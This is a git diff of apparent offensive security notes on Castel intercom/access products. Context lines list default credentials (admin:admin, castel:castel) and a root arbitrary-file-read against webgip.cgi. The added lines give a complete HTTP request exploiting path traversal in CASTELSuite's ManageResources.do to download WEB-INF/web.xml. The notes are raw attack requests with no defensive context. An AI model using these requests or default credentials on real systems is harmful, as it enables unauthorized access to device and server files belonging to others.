@@ -3,6 +3,8 @@
 admin:admin
 castel:castel
 
+#### Castel ?? #####
+
 #Arbitrary File Read (As Root)
 
 POST /castel-cfg/cgi-bin/webgip.cgi HTTP/1.1
@@ -85,4 +87,23 @@ protocol=2&page=35&mode=21&lang=en&bt=54&gid=&fichier_a_envoyer_type=&fichier_a_
 #Interesting files : 
 
 /usr/lighttpd/www/castel-cfg/cgi-bin/webgip.cgi (Compiled need to be reversed)
+
+
+
+#### Castel Suite  #####
+
+Arbitrary Read Files
+
+GET /CASTELSuite/ManageResources.do?element.label=../../../../WEB-INF/web.xml&specificOperation=OPERATION_DOWNLOAD&RM_DATATYPE=RES_AUDIO_XELLIP2 HTTP/1.1
+Host: X
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=XX
+Upgrade-Insecure-Requests: 1
+
+
 
